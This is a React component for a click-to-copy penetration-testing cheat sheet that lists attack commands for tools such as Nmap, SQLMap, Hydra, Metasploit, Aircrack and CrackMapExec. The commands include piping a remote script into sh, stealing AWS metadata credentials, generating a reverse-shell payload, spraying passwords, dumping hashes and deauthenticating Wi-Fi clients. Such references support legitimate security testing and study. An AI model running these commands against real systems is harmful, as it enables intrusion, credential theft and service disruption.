'use client'
import React, { useState } from 'react'

const CHEATSHEETS: Record<string, { desc: string; color: string; commands: { label: string; cmd: string }[] }> = {
  'Nmap': {
    desc: 'Network discovery & security auditing',
    color: '#00ff41',
    commands: [
      { label: 'SYN scan (stealth)', cmd: 'nmap -sS -T4 TARGET' },
      { label: 'Full port scan', cmd: 'nmap -p- -T4 TARGET' },
      { label: 'Service + version', cmd: 'nmap -sV -sC TARGET' },
      { label: 'OS detection', cmd: 'nmap -O TARGET' },
      { label: 'All recon combined', cmd: 'nmap -sV -sC -O -p- -T4 -oA scan TARGET' },
      { label: 'Ping sweep', cmd: 'nmap -sn 192.168.1.0/24' },
      { label: 'SMB vuln check', cmd: 'nmap --script smb-vuln-* -p 445 TARGET' },
      { label: 'HTTP enumeration', cmd: 'nmap --script http-enum -p 80,443 TARGET' },
      { label: 'Firewall evasion', cmd: 'nmap -D RND:10 -f --mtu 24 TARGET' },
      { label: 'UDP scan', cmd: 'nmap -sU --top-ports 100 TARGET' },
    ],
  },
  'Gobuster': {
    desc: 'Directory & DNS bruteforcing',
    color: '#00d4ff',
    commands: [
      { label: 'Directory scan', cmd: 'gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt' },
      { label: 'With extensions', cmd: 'gobuster dir -u http://TARGET -w wordlist.txt -x php,html,txt,bak' },
      { label: 'DNS subdomain', cmd: 'gobuster dns -d example.com -w subdomains.txt' },
      { label: 'With cookies', cmd: 'gobuster dir -u http://TARGET -w wordlist.txt -c "session=abc123"' },
      { label: 'Increase threads', cmd: 'gobuster dir -u http://TARGET -w wordlist.txt -t 50' },
    ],
  },
  'SQLMap': {
    desc: 'Automated SQL injection',
    color: '#ffb347',
    commands: [
      { label: 'Basic scan', cmd: 'sqlmap -u "http://TARGET/page?id=1"' },
      { label: 'POST request', cmd: 'sqlmap -u "http://TARGET" --data="user=a&pass=b"' },
      { label: 'From Burp request', cmd: 'sqlmap -r request.txt' },
      { label: 'List databases', cmd: 'sqlmap -u "URL" --dbs' },
      { label: 'Dump table', cmd: 'sqlmap -u "URL" -D db -T users --dump' },
      { label: 'Bypass WAF', cmd: 'sqlmap -u "URL" --tamper=space2comment --random-agent' },
      { label: 'OS shell', cmd: 'sqlmap -u "URL" --os-shell' },
      { label: 'Via Tor', cmd: 'sqlmap -u "URL" --tor --tor-type=SOCKS5' },
    ],
  },
  'Hydra': {
    desc: 'Online password brute forcing',
    color: '#ff4136',
    commands: [
      { label: 'SSH brute force', cmd: 'hydra -l user -P rockyou.txt ssh://TARGET' },
      { label: 'SSH user list', cmd: 'hydra -L users.txt -P passwords.txt ssh://TARGET -t 4' },
      { label: 'HTTP POST form', cmd: 'hydra -l admin -P rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"' },
      { label: 'FTP brute force', cmd: 'hydra -l admin -P rockyou.txt ftp://TARGET' },
      { label: 'RDP brute force', cmd: 'hydra -l administrator -P rockyou.txt rdp://TARGET' },
      { label: 'Specify port', cmd: 'hydra -l admin -P pass.txt -s 8080 TARGET http-get' },
    ],
  },
  'Hashcat': {
    desc: 'Offline password cracking',
    color: '#bf5fff',
    commands: [
      { label: 'MD5 dictionary', cmd: 'hashcat -m 0 hashes.txt rockyou.txt' },
      { label: 'NTLM (Windows)', cmd: 'hashcat -m 1000 hashes.txt rockyou.txt' },
      { label: 'NTLMv2 (Responder)', cmd: 'hashcat -m 5600 hashes.txt rockyou.txt' },
      { label: 'bcrypt', cmd: 'hashcat -m 3200 hashes.txt rockyou.txt' },
      { label: 'With rules', cmd: 'hashcat -m 1000 hashes.txt rockyou.txt -r rules/best64.rule' },
      { label: 'Mask attack', cmd: 'hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?d?d?d?d' },
      { label: 'Show cracked', cmd: 'hashcat -m 0 hashes.txt --show' },
      { label: 'WPA2 handshake', cmd: 'hashcat -m 22000 hash.hc22000 rockyou.txt' },
    ],
  },
  'Metasploit': {
    desc: 'Exploitation framework',
    color: '#00ff41',
    commands: [
      { label: 'Start msfconsole', cmd: 'msfconsole' },
      { label: 'Search exploit', cmd: 'search type:exploit name:eternalblue' },
      { label: 'Use module', cmd: 'use exploit/windows/smb/ms17_010_eternalblue' },
      { label: 'Set target', cmd: 'set RHOSTS 192.168.1.100' },
      { label: 'Show options', cmd: 'show options' },
      { label: 'Run exploit', cmd: 'run' },
      { label: 'Background session', cmd: 'background' },
      { label: 'List sessions', cmd: 'sessions -l' },
      { label: 'Interact session', cmd: 'sessions -i 1' },
      { label: 'Dump hashes', cmd: 'hashdump' },
      { label: 'Local privesc', cmd: 'run post/multi/recon/local_exploit_suggester' },
      { label: 'Generate payload', cmd: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe' },
    ],
  },
  'Linux PrivEsc': {
    desc: 'Linux privilege escalation',
    color: '#ffb347',
    commands: [
      { label: 'Current user info', cmd: 'whoami && id && groups' },
      { label: 'Sudo permissions', cmd: 'sudo -l' },
      { label: 'SUID binaries', cmd: 'find / -perm -u=s -type f 2>/dev/null' },
      { label: 'World-writable', cmd: 'find / -writable -type f 2>/dev/null | grep -v proc' },
      { label: 'Cron jobs', cmd: 'cat /etc/cron* /var/spool/cron/* 2>/dev/null' },
      { label: 'Run LinPEAS', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh' },
      { label: 'Kernel version', cmd: 'uname -r && cat /etc/os-release' },
      { label: 'Network info', cmd: 'netstat -tulpn && ip route' },
    ],
  },
  'Shodan': {
    desc: 'Internet device search engine',
    color: '#00d4ff',
    commands: [
      { label: 'Search by org', cmd: 'org:"Company Name" port:443' },
      { label: 'SSL cert enum', cmd: 'ssl.cert.subject.cn:"*.example.com"' },
      { label: 'Exposed MongoDB', cmd: 'port:27017 product:MongoDB -authentication' },
      { label: 'Exposed Elasticsearch', cmd: 'port:9200 product:Elasticsearch all:search' },
      { label: 'Open directories', cmd: 'http.title:"Index of /"' },
      { label: 'CLI host lookup', cmd: 'shodan host IP_ADDRESS' },
      { label: 'CLI search', cmd: 'shodan search \'org:"Target" port:22\'' },
      { label: 'Count results', cmd: 'shodan count \'port:27017 product:MongoDB\'' },
    ],
  },
  'Amass / Subfinder': {
    desc: 'Subdomain enumeration',
    color: '#00ff41',
    commands: [
      { label: 'Amass passive', cmd: 'amass enum -d example.com -passive' },
      { label: 'Amass active', cmd: 'amass enum -d example.com -active' },
      { label: 'Subfinder fast', cmd: 'subfinder -d example.com -silent' },
      { label: 'Cert transparency', cmd: 'curl "https://crt.sh/?q=%25.example.com&output=json" | python3 -c "import json,sys;[print(r[\'name_value\']) for r in json.load(sys.stdin)]" | sort -u' },
      { label: 'DNS brute force', cmd: 'dnsrecon -d example.com -t brt -D wordlist.txt' },
    ],
  },
  'Torsocks': {
    desc: 'Route traffic through Tor',
    color: '#00ff41',
    commands: [
      { label: 'Start Tor service', cmd: 'sudo systemctl start tor' },
      { label: 'Verify Tor IP', cmd: 'torsocks curl https://check.torproject.org/api/ip' },
      { label: 'Wrap any command', cmd: 'torsocks COMMAND_HERE' },
      { label: 'Tor shell', cmd: 'torsocks bash' },
      { label: 'Force new circuit', cmd: 'echo -e \'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT\' | nc 127.0.0.1 9051' },
      { label: 'Start Nyx monitor', cmd: 'sudo nyx' },
      { label: 'Create hidden service', cmd: 'echo "HiddenServiceDir /var/lib/tor/hs/\nHiddenServicePort 80 127.0.0.1:8080" | sudo tee -a /etc/tor/torrc' },
    ],
  },
  'Aircrack': {
    desc: 'WiFi security testing',
    color: '#aaff00',
    commands: [
      { label: 'Enable monitor mode', cmd: 'sudo airmon-ng start wlan0' },
      { label: 'Kill interfering procs', cmd: 'sudo airmon-ng check kill' },
      { label: 'Scan networks', cmd: 'sudo airodump-ng wlan0mon' },
      { label: 'Target capture', cmd: 'sudo airodump-ng -c CHANNEL --bssid AP_MAC -w capture wlan0mon' },
      { label: 'Deauth attack', cmd: 'sudo aireplay-ng --deauth 10 -a AP_MAC -c CLIENT_MAC wlan0mon' },
      { label: 'Crack handshake', cmd: 'aircrack-ng -w rockyou.txt capture-01.cap' },
      { label: 'Convert to hashcat', cmd: 'hcxpcapngtool -o hash.hc22000 capture-01.cap' },
      { label: 'PMKID capture', cmd: 'sudo hcxdumptool -i wlan0mon -o pmkid.pcapng' },
      { label: 'WPS scan', cmd: 'sudo wash -i wlan0mon' },
      { label: 'Pixie Dust attack', cmd: 'sudo reaver -i wlan0mon -b AP_MAC -vv -K 1' },
    ],
  },
  'Frida': {
    desc: 'Dynamic instrumentation for mobile',
    color: '#7c4dff',
    commands: [
      { label: 'List processes', cmd: 'frida-ps -U' },
      { label: 'Attach to app', cmd: 'frida -U com.target.app' },
      { label: 'Run script', cmd: 'frida -U com.target.app -l script.js' },
      { label: 'SSL unpin', cmd: 'frida -U com.target.app -l ssl-bypass.js' },
      { label: 'Objection start', cmd: 'objection -g com.target.app explore' },
      { label: 'Disable SSL pin', cmd: 'android sslpinning disable' },
      { label: 'Bypass root detect', cmd: 'android root disable' },
      { label: 'List activities', cmd: 'android hooking list activities' },
    ],
  },
  'AWS CLI': {
    desc: 'Cloud security enumeration',
    color: '#ff9500',
    commands: [
      { label: 'Who am I', cmd: 'aws sts get-caller-identity' },
      { label: 'List S3 buckets', cmd: 'aws s3 ls' },
      { label: 'List bucket contents', cmd: 'aws s3 ls s3://bucket-name' },
      { label: 'Download bucket', cmd: 'aws s3 sync s3://bucket-name ./local --no-sign-request' },
      { label: 'List IAM users', cmd: 'aws iam list-users' },
      { label: 'List roles', cmd: 'aws iam list-roles' },
      { label: 'Steal IMDS creds', cmd: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
      { label: 'List EC2 instances', cmd: 'aws ec2 describe-instances --output table' },
      { label: 'List Lambda', cmd: 'aws lambda list-functions' },
      { label: 'List secrets', cmd: 'aws secretsmanager list-secrets' },
    ],
  },
  'CrackMapExec': {
    desc: 'Network lateral movement',
    color: '#00ffff',
    commands: [
      { label: 'SMB scan subnet', cmd: 'cme smb 192.168.1.0/24' },
      { label: 'Check shares', cmd: 'cme smb 192.168.1.0/24 --shares' },
      { label: 'Spray creds', cmd: 'cme smb 192.168.1.0/24 -u admin -p Password123' },
      { label: 'Run command', cmd: 'cme smb TARGET -u admin -p pass -x "whoami"' },
      { label: 'Dump SAM hashes', cmd: 'cme smb TARGET -u admin -p pass --sam' },
      { label: 'Pass the hash', cmd: 'cme smb TARGET -u admin -H NTLM_HASH' },
      { label: 'Check WinRM', cmd: 'cme winrm 192.168.1.0/24 -u admin -p pass' },
    ],
  },
  'BloodHound': {
    desc: 'Active Directory attack paths',
    color: '#ff4136',
    commands: [
      { label: 'Install deps', cmd: 'sudo apt install bloodhound neo4j' },
      { label: 'Start neo4j', cmd: 'sudo neo4j start' },
      { label: 'Run SharpHound', cmd: 'SharpHound.exe -c All' },
      { label: 'Python collector', cmd: 'bloodhound-python -u user -p pass -d domain.local -ns DC_IP -c all' },
      { label: 'Find DA paths', cmd: 'MATCH p=shortestPath((u:User)-[*1..]->(g:Group{name:"DOMAIN ADMINS@DOMAIN"})) RETURN p' },
      { label: 'Kerberoastable users', cmd: 'MATCH (u:User{hasspn:true}) RETURN u.name' },
      { label: 'Find local admins', cmd: 'MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name,c.name' },
    ],
  },
}

export default function CheatSheet() {
  const [open, setOpen] = useState(false)
  const [selected, setSelected] = useState('Nmap')
  const [search, setSearch] = useState('')
  const [copied, setCopied] = useState('')

  const copy = (cmd: string) => {
    navigator.clipboard.writeText(cmd).catch(() => {})
    setCopied(cmd)
    setTimeout(() => setCopied(''), 1500)
  }

  const sheet = CHEATSHEETS[selected]
  const filtered = sheet.commands.filter(c =>
    search === '' || c.label.toLowerCase().includes(search.toLowerCase()) || c.cmd.toLowerCase().includes(search.toLowerCase())
  )

  return (
    <>
      <style>{`
        .cs-btn{position:fixed;bottom:24px;left:24px;z-index:9000}
        .cs-panel{position:fixed;bottom:62px;left:24px;z-index:9001;width:320px;max-height:40vh}
        @media(max-width:768px){
          .cs-btn{bottom:12px;left:8px}
          .cs-panel{bottom:54px;left:8px;right:8px;width:auto;max-height:55vh}
        }
      `}</style>
      <button
        onClick={() => setOpen(!open)}
        className="cs-btn"
        style={{
          background: 'rgba(0,212,255,0.08)', border: '1px solid rgba(0,212,255,0.3)',
          borderRadius: '6px', padding: '4px 10px', cursor: 'pointer',
          fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', color: '#00d4ff',
          letterSpacing: '0.1em', display: 'flex', alignItems: 'center', gap: '5px',
          height: '32px', boxSizing: 'border-box' as const,
        }}
      >
        <span style={{ fontSize: '11px' }}>{'{}'}</span> CHEAT SHEETS
      </button>

      {open && (
        <div className="cs-panel" style={{
          background: '#080c0a', border: '1px solid rgba(0,212,255,0.2)',
          borderRadius: '10px', display: 'flex', flexDirection: 'column',
          fontFamily: 'JetBrains Mono, monospace', overflow: 'hidden',
        }}>
          <div style={{ padding: '8px 12px', borderBottom: '1px solid #1a2e1e', background: 'rgba(0,212,255,0.04)', display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexShrink: 0 }}>
            <span style={{ fontSize: '10px', color: '#00d4ff', fontWeight: 700, letterSpacing: '0.15em' }}>CHEAT SHEETS</span>
            <button onClick={() => setOpen(false)} style={{ background: 'none', border: 'none', color: '#2a5a2a', cursor: 'pointer', fontSize: '16px', lineHeight: 1 }}>×</button>
          </div>

          <div style={{ display: 'flex', gap: '3px', padding: '6px 8px', borderBottom: '1px solid #1a2e1e', flexWrap: 'wrap' as const, flexShrink: 0 }}>
            {Object.keys(CHEATSHEETS).map(tool => (
              <button key={tool} onClick={() => { setSelected(tool); setSearch('') }} style={{ background: selected === tool ? CHEATSHEETS[tool].color + '15' : 'transparent', border: '1px solid ' + (selected === tool ? CHEATSHEETS[tool].color + '44' : '#1a2e1e'), borderRadius: '3px', padding: '2px 6px', cursor: 'pointer', fontSize: '7px', color: selected === tool ? CHEATSHEETS[tool].color : '#3a6a3a', letterSpacing: '0.05em' }}>{tool}</button>
            ))}
          </div>

          <div style={{ padding: '5px 8px', borderBottom: '1px solid #0e1a10', flexShrink: 0 }}>
            <input
              value={search}
              onChange={e => setSearch(e.target.value)}
              placeholder="Search..."
              style={{ width: '100%', background: 'transparent', border: '1px solid #1a2e1e', borderRadius: '3px', padding: '3px 7px', color: '#8a9a8a', fontSize: '0.68rem', fontFamily: 'JetBrains Mono, monospace', outline: 'none', boxSizing: 'border-box' as const }}
            />
          </div>

          <div style={{ padding: '3px 8px 2px', borderBottom: '1px solid #0e1a10', flexShrink: 0 }}>
            <span style={{ fontSize: '8px', color: '#3a6a3a' }}>{sheet.desc}</span>
          </div>

          <div style={{ flex: 1, overflowY: 'auto', padding: '4px 6px' }}>
            {filtered.map((c, i) => (
              <div key={i} onClick={() => copy(c.cmd)} style={{ padding: '6px 8px', borderRadius: '3px', cursor: 'pointer', marginBottom: '2px', background: copied === c.cmd ? 'rgba(0,255,65,0.06)' : 'rgba(0,212,255,0.02)', border: '1px solid ' + (copied === c.cmd ? 'rgba(0,255,65,0.2)' : '#1a2e1e'), transition: 'all 0.1s' }}>
                <div style={{ fontSize: '7px', color: copied === c.cmd ? '#00ff41' : '#3a8a9a', marginBottom: '2px', letterSpacing: '0.05em' }}>{copied === c.cmd ? '✓ COPIED' : c.label}</div>
                <div style={{ fontSize: '0.67rem', color: sheet.color, fontFamily: 'JetBrains Mono, monospace', wordBreak: 'break-all' as const }}>{c.cmd}</div>
              </div>
            ))}
            {filtered.length === 0 && <div style={{ fontSize: '0.68rem', color: '#2a4a2a', padding: '10px', textAlign: 'center' }}>No matches for &quot;{search}&quot;</div>}
          </div>

          <div style={{ padding: '4px 8px', borderTop: '1px solid #0e1a10', fontSize: '7px', color: '#2a4a2a', letterSpacing: '0.08em', flexShrink: 0 }}>
            CLICK TO COPY · {filtered.length} COMMANDS
          </div>
        </div>
      )}
    </>
  )
}
